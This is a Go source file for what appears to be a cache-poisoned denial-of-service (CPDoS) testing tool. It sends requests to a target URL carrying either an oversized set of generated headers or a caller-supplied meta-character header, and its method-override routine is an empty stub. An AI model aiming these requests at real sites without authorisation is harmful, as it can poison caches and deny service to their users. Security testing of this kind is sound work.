package internal

import (
	"fmt"

	"github.com/naiba/com"
	"github.com/parnurzeal/gorequest"
)

// CPDoSExp CPDoS测试工具
type CPDoSExp struct {
	URL string
	req *gorequest.SuperAgent
}

// NewCPDoSExp ...
func NewCPDoSExp(url string) *CPDoSExp {
	return &CPDoSExp{
		URL: url,
		req: gorequest.New(),
	}
}

func (ce *CPDoSExp) preClear(req *gorequest.SuperAgent) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36")
}

// Get ..
func (ce *CPDoSExp) Get() (string, int) {
	ce.preClear(ce.req.Get(ce.URL))
	return ce.formatResp(ce.req.End())
}

// HHO HTTP Header Oversize
func (ce *CPDoSExp) HHO(num int64) (string, int) {
	ce.preClear(ce.req.Get(ce.URL))
	var i int64
	for i = 0; i < num; i++ {
		iStr := fmt.Sprintf("%d", i)
		ce.req.Header.Set("X-SESSION-CPDoS-"+iStr, "Session-"+com.MD5(iStr))
	}
	return ce.formatResp(ce.req.End())
}

// HMC HTTP Meta Character
func (ce *CPDoSExp) HMC(str string) (string, int) {
	ce.preClear(ce.req.Get(ce.URL))
	ce.req.Header.Set("X-REQUEST-CPDoS", str)
	return ce.formatResp(ce.req.End())
}

// HMO HTTP Method Override
func (ce *CPDoSExp) HMO() (string, int) {
	return "", 0
}

func (ce *CPDoSExp) formatResp(resp gorequest.Response, body string, errs []error) (string, int) {
	if errs != nil {
		return errs[0].Error(), 0
	}
	return body, resp.StatusCode
}
